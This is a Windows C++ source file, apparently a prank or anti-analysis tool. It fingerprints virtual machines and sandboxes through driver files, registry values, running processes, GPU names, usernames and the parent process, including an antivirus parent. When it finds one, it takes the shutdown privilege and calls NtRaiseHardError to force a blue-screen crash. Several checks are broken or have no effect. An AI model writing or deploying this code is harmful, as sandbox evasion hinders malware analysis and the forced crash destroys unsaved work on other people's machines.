#include <windows.h>
#include <stdio.h>
#include <unistd.h>

#include <string>

#include <DXGI.h>  
#include <vector> 
#include <iostream>
#include <psapi.h>

#include <tlhelp32.h>
using namespace std;
const char* filenames[] = {
	"C:\\windows\\System32\\Drivers\\Vmmouse.sys",
"C:\\windows\\System32\\Drivers\\vmtray.dll",
"C:\\windows\\System32\\Drivers\\VMToolsHook.dll",
"C:\\windows\\System32\\Drivers\\vmmousever.dll",
"C:\\windows\\System32\\Drivers\\vmhgfs.dll",
"C:\\windows\\System32\\Drivers\\vmGuestLib.dll",
"C:\\windows\\System32\\Drivers\\VBoxMouse.sys",
"C:\\windows\\System32\\Drivers\\VBoxGuest.sys",
"C:\\windows\\System32\\Drivers\\VBoxSF.sys",
"C:\\windows\\System32\\Drivers\\VBoxVideo.sys",
"C:\\windows\\System32\\vboxdisp.dll",
"C:\\windows\\System32\\vboxhook.dll",
"C:\\windows\\System32\\vboxoglerrorspu.dll",
"C:\\windows\\System32\\vboxoglpassthroughspu.dll",
"C:\\windows\\System32\\vboxservice.exe",
"C:\\windows\\System32\\vboxtray.exe",
"C:\\windows\\System32\\VBoxControl.exe"
};


// 辅助函数：检查字符串是否包含特定子字符串（不区分大小写）
int containsSubstring(const char* str, const char* substr) {
	char lowerStr[128];
	char lowerSubstr[128];
	int i;

	// 将字符串和子字符串转换为小写
	for (i = 0; str[i] && i < 127; i++) {
		lowerStr[i] = tolower((unsigned char)str[i]);
	}
	lowerStr[i] = '\0';

	for (i = 0; substr[i] && i < 127; i++) {
		lowerSubstr[i] = tolower((unsigned char)substr[i]);
	}
	lowerSubstr[i] = '\0';

	return strstr(lowerStr, lowerSubstr) != NULL;
}

std::string WStringToString(const std::wstring &wstr)
{
	   std::string str(wstr.length(), ' ');
	   std::copy(wstr.begin(), wstr.end(), str.begin());
	  return str;
}
DWORD WINAPI GPUProcDetect(LPVOID lpParameter)
{

	// 参数定义  
	IDXGIFactory * pFactory;
	IDXGIAdapter * pAdapter;
	std::vector <IDXGIAdapter*> vAdapters;            // 显卡  
 
 
	// 显卡的数量  
	int iAdapterNum = 0;
 
 
	// 创建一个DXGI工厂  
	HRESULT hr = CreateDXGIFactory(__uuidof(IDXGIFactory), (void**)(&pFactory));
 
	if (FAILED(hr))
		return -1;
 
	// 枚举适配器  
	while (pFactory->EnumAdapters(iAdapterNum, &pAdapter) != DXGI_ERROR_NOT_FOUND)
	{
		vAdapters.push_back(pAdapter);
		++iAdapterNum;
	}
 
	// 信息输出   
//	cout << "===============获取到" << iAdapterNum << "块显卡===============" << endl;
	for (size_t i = 0; i < vAdapters.size(); i++)
	{
		// 获取信息  
		DXGI_ADAPTER_DESC adapterDesc;
		vAdapters[i]->GetDesc(&adapterDesc);
		wstring aa(adapterDesc.Description);
		std::string bb = WStringToString(aa);
		// 输出显卡信息  
//		cout << "系统视频内存:" << adapterDesc.DedicatedSystemMemory / 1024 / 1024 << "M" << endl;
//		cout << "专用视频内存:" << adapterDesc.DedicatedVideoMemory / 1024 / 1024 << "M" << endl;
//		cout << "共享系统内存:" << adapterDesc.SharedSystemMemory / 1024 / 1024 << "M" << endl;
//		cout << "设备描述:" << bb.c_str()<< endl;
//		cout << "设备ID:" << adapterDesc.DeviceId << endl;
//		cout << "PCI ID修正版本:" << adapterDesc.Revision << endl;
//		cout << "子系统PIC ID:" << adapterDesc.SubSysId << endl;
//		cout << "厂商编号:" << adapterDesc.VendorId << endl;

		if(containsSubstring(bb.c_str(), "vmware") || containsSubstring(bb.c_str(), "virtualbox") || containsSubstring(bb.c_str(), "virtualpc")|| containsSubstring(bb.c_str(), "qemu")){
			return 1145;
		}
 
		// 输出设备  
		IDXGIOutput * pOutput;
		std::vector<IDXGIOutput*> vOutputs;
		// 输出设备数量  
		int iOutputNum = 0;
		while (vAdapters[i]->EnumOutputs(iOutputNum, &pOutput) != DXGI_ERROR_NOT_FOUND)
		{
			vOutputs.push_back(pOutput);
			iOutputNum++;
		}
 
//		cout << "-----------------------------------------" << endl;
//		cout << "获取到" << iOutputNum << "个显示设备:" << endl;
//		cout << endl;
 
		for (size_t n = 0; n < vOutputs.size(); n++)
		{
			// 获取显示设备信息  
			DXGI_OUTPUT_DESC outputDesc;
			vOutputs[n]->GetDesc(&outputDesc);
 
			// 获取设备支持  
			UINT uModeNum = 0;
			DXGI_FORMAT format = DXGI_FORMAT_R8G8B8A8_UNORM;
			UINT flags = DXGI_ENUM_MODES_INTERLACED;
 
			vOutputs[n]->GetDisplayModeList(format, flags, &uModeNum, 0);
			DXGI_MODE_DESC * pModeDescs = new DXGI_MODE_DESC[uModeNum];
			vOutputs[n]->GetDisplayModeList(format, flags, &uModeNum, pModeDescs);
 		if(containsSubstring(WStringToString(outputDesc.DeviceName).c_str(), "vmware") || containsSubstring(WStringToString(outputDesc.DeviceName).c_str(), "virtualbox") || containsSubstring(WStringToString(outputDesc.DeviceName).c_str(), "virtualpc") || containsSubstring(WStringToString(outputDesc.DeviceName).c_str(), "qemu")){
			return 1145;
		}
//			cout << "显示设备名称:" << outputDesc.DeviceName << endl;
//			cout << "显示设备当前分辨率:" << outputDesc.DesktopCoordinates.right - outputDesc.DesktopCoordinates.left << "*" << outputDesc.DesktopCoordinates.bottom - outputDesc.DesktopCoordinates.top << endl;
			cout << endl;
 
			// 所支持的分辨率信息  
//			cout << "分辨率信息:" << endl;
//			for (UINT m = 0; m < uModeNum; m++)
//			{
//				cout << "== 分辨率:" << pModeDescs[m].Width << "*" << pModeDescs[m].Height << "     刷新率" << (pModeDescs[m].RefreshRate.Numerator) / (pModeDescs[m].RefreshRate.Denominator) << endl;
//			}
		}
		vOutputs.clear();
 
	}
	vAdapters.clear();
}
bool CheckReg(std::string value, std::string target, std::string searchTarget)
{
		HKEY HK;
    char szBuffer[64];

    unsigned long hSize = sizeof(szBuffer)-1;
	
	bool bCheckflag = false;
		if (ERROR_SUCCESS == RegOpenKeyExA(HKEY_LOCAL_MACHINE, (char *)value.c_str(), 0, KEY_READ, &HK))
		{
			        RegQueryValueEx(HK, (char *)target.c_str(), NULL, NULL, (unsigned char *)szBuffer, &hSize);

        if (strstr(szBuffer, (char *)searchTarget.c_str()))
        {
            bCheckflag = true;
        }

        RegCloseKey(HK);
		}
	

	return bCheckflag;
}
bool getProcess(const char *procressName)                //????????????
{
        	const char* list[] = {
		//Vmware
		"vmtoolsd.exe",
		"vmacthlp.exe",
		"vmwaretray.exe",
		"vmwareuser.exe",
		
		//virtuablBox
		"vboxserivce.exe",
		"vboxtray.exe",

		//virtualPC
		"vmsrvc.exe",
		"vmusrvc.exe",
		"vpcmap.exe"
		};
    char pName[MAX_PATH];                                //?PROCESSENTRY32?????szExeFile????????,????
    strcpy(pName,procressName);                            //????
    CharLowerBuff(pName,MAX_PATH);                        //????????
    PROCESSENTRY32 currentProcess;                        //??????????????
    currentProcess.dwSize = sizeof(currentProcess);        //?????????,???????
    HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);//??????????????
 
    if (hProcess == INVALID_HANDLE_VALUE)
    {
        printf("Failed to check process\n");
        return false;
    }
 
    bool bMore=Process32First(hProcess,&currentProcess);        //?????????
    while(bMore)
    {
        CharLowerBuff(currentProcess.szExeFile,MAX_PATH);
		int ii = 0;        //?????????
		while(ii < 9){
		
        if (strcmp(currentProcess.szExeFile,list[ii])==0)            //?????????
        {
            CloseHandle(hProcess);                                //??hProcess??
            return true;
        }
        ii++;
		}
        bMore=Process32Next(hProcess,&currentProcess);            //?????
    }
 
    CloseHandle(hProcess);    //??hProcess??
    return false;
}
bool DetectVM() {
    HKEY hKey;

    char szBuffer[64];
    char szBuffer1[64];
        char szBuffer2[64];
           char username[1024];
           char username1[1024];
   GetEnvironmentVariableA("USERNAME", username, sizeof username);
   DWORD usernameLength = sizeof username1;
   GetUserNameA(username, &usernameLength);
	if(containsSubstring(username, "WDAGUtilityAccount") || containsSubstring(username1, "WDAGUtilityAccount") || containsSubstring(username, "SYSTEM") || containsSubstring(username, "NULL") || containsSubstring(username1, "SYSTEM") || containsSubstring(username, "HOMO")){
		return true;
	}
	if(GPUProcDetect(NULL) == 1145){
		return true;
	}
	
    unsigned long hSize = sizeof(szBuffer)-1;
		std::string stringVmRegKeys2[] =
	{
		//VMWare
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\1",
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\2",
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\3",
		"HARDWARE\\DESCRIPTION\\System\\BIOS",
		"HARDWARE\\DESCRIPTION\\System"
	};
	if(
	CheckReg(stringVmRegKeys2[0], "ProcessorNameString", "QEMU")||
	CheckReg(stringVmRegKeys2[0], "ProcessorNameString", "TCG")||
	CheckReg(stringVmRegKeys2[0], "ProcessorNameString", "VMWARE")
	||CheckReg(stringVmRegKeys2[1], "ProcessorNameString", "QEMU")||
	CheckReg(stringVmRegKeys2[1], "ProcessorNameString", "TCG")||
	CheckReg(stringVmRegKeys2[1], "ProcessorNameString", "VMWARE")||
	CheckReg(stringVmRegKeys2[2], "ProcessorNameString", "QEMU")||
	CheckReg(stringVmRegKeys2[2], "ProcessorNameString", "TCG")||
	CheckReg(stringVmRegKeys2[2], "ProcessorNameString", "VMWARE")
	||CheckReg(stringVmRegKeys2[3], "ProcessorNameString", "QEMU")||
	CheckReg(stringVmRegKeys2[3], "ProcessorNameString", "TCG")||
	CheckReg(stringVmRegKeys2[3], "ProcessorNameString", "VMWARE")||
	CheckReg(stringVmRegKeys2[0], "ProcessorName", "QEMU")||
	CheckReg(stringVmRegKeys2[0], "ProcessorName", "TCG")||
	CheckReg(stringVmRegKeys2[0], "ProcessorName", "VMWARE")
	||CheckReg(stringVmRegKeys2[1], "ProcessorName", "QEMU")||
	CheckReg(stringVmRegKeys2[1], "ProcessorName", "TCG")||
	CheckReg(stringVmRegKeys2[1], "ProcessorName", "VMWARE")||
	CheckReg(stringVmRegKeys2[2], "ProcessorName", "QEMU")||
	CheckReg(stringVmRegKeys2[2], "ProcessorName", "TCG")||
	CheckReg(stringVmRegKeys2[2], "ProcessorName", "VMWARE")
	||CheckReg(stringVmRegKeys2[3], "ProcessorName", "QEMU")||
	CheckReg(stringVmRegKeys2[3], "ProcessorName", "TCG")||
	CheckReg(stringVmRegKeys2[3], "ProcessorName", "VMWARE")||
	CheckReg(stringVmRegKeys2[4], "SystemProductName", "Virtual Machine")||
	CheckReg(stringVmRegKeys2[5], "SystemBiosVersion", "VIRTUAL")||CheckReg(stringVmRegKeys2[5], "SystemBiosVersion", "VRTUAL")||
	CheckReg(stringVmRegKeys2[5], "SystemBiosVersion", "Hyper-V")||
	CheckReg(stringVmRegKeys2[5], "SystemBiosVersion", "VMWare")||
	CheckReg(stringVmRegKeys2[5], "SystemBiosVersion", "BOX")||CheckReg(stringVmRegKeys2[4], "SystemProductName", "Bochs")||
	CheckReg(stringVmRegKeys2[5], "SystemBiosVersion", "BOCHS")||
	
	CheckReg(stringVmRegKeys2[4], "BIOSVersion", "VIRTUAL")||
	CheckReg(stringVmRegKeys2[4], "BIOSVersion", "Hyper-V")||
	CheckReg(stringVmRegKeys2[4], "BIOSVersion", "VMWare")||
	CheckReg(stringVmRegKeys2[0], "ProcessorNameString", "Virtual")||
CheckReg(stringVmRegKeys2[1], "ProcessorNameString", "Virtual")||
CheckReg(stringVmRegKeys2[2], "ProcessorNameString", "Virtual")||
CheckReg(stringVmRegKeys2[3], "ProcessorNameString", "Virtual")||
CheckReg(stringVmRegKeys2[0], "ProcessorName", "Virtual")||
CheckReg(stringVmRegKeys2[1], "ProcessorName", "Virtual")||
CheckReg(stringVmRegKeys2[2], "ProcessorName", "Virtual")||
CheckReg(stringVmRegKeys2[3], "ProcessorName", "Virtual")     ){
		return true;
	}

    DWORD parentPID = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
    if (Process32First(hSnapshot, &pe32))
    {
        do {
            if (pe32.th32ProcessID == GetCurrentProcessId())
            {
                parentPID = pe32.th32ParentProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);

    // ????????????
    if (parentPID != 0){
	
        

    HANDLE hParentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPID);
    if (hParentProcess != NULL){
	

    std::wstring parentName(MAX_PATH, L'\0');
    DWORD len = GetProcessImageFileNameW(hParentProcess, &parentName[0], MAX_PATH);
    parentName.resize(len);


    // ??????????VMware?VirtualBox?????????
    if (parentName.find(L"vmware") != std::wstring::npos ||
        parentName.find(L"vbox") != std::wstring::npos ||
        parentName.find(L"qemu") != std::wstring::npos ||
        parentName.find(L"vmsrvc") != std::wstring::npos ||
        parentName.find(L"360") != std::wstring::npos)
    {
        return true;
    }

    CloseHandle(hParentProcess);
	}
	}


	if (getProcess("") == true){
		return true;
	}
	
	    HKEY hKey3;
	char* stringVmRegKeys[] =
	{
		//VMWare
		"SOFTWARE\\Clients\\StartMenuInternet\\VMWAREHOSTOPEN.EXE",
		"SOFTWARE\\VMware, Inc.\\VMware Tools",
		"SYSTEM\\CurrentControlSet\\Enum\\SCSI\\Disk&Ven_VMware_&Prod_VMware_Virtual_S",
		
		// Virtual PC or VirtualBox
		"SYSTEM\\CurrentControlSet\\Control\\VirtualDeviceDrivers"
	};
	
	bool bCheckflag = false;
	for (size_t i = 0; i < sizeof(stringVmRegKeys) / sizeof(stringVmRegKeys[0]); i++)
	{
		if (ERROR_SUCCESS == RegOpenKeyEx(HKEY_LOCAL_MACHINE,stringVmRegKeys[i], 0, KEY_READ, &hKey3))
		{
		}
	}
	
	
	

	int times = 0;
	while(times < 17){
		access(filenames[times],F_OK);
		times++;
	}

    return false;
}

int main() {
	FreeConsole();
        	HANDLE hProc;
	HANDLE TokenHandle;
	TOKEN_PRIVILEGES NewState;

	hProc = GetCurrentProcess();
	OpenProcessToken(hProc, 0x28u, &TokenHandle);
	LookupPrivilegeValueA(0, "SeShutdownPrivilege", (PLUID)NewState.Privileges);
	NewState.PrivilegeCount = 1;
	NewState.Privileges[0].Attributes = 2;

	AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);

	HMODULE ntdll = GetModuleHandleA("NTDLL.DLL");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

    	DWORD tmp;
    if (DetectVM()==true) {
    	    	    	Beep(415, 200);
    	Beep(415, 50);
    	Beep(466, 50);
    	Beep(523, 200);
		Beep(415, 200);
		Beep(466, 200); 
		Beep(466, 50); 
		Beep(523, 50);
		Beep(392, 200);
		Beep(311, 200);
		Sleep(1000);
	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0114514, 0, 0, 0, 6, &tmp);
    }
    return 0;
}
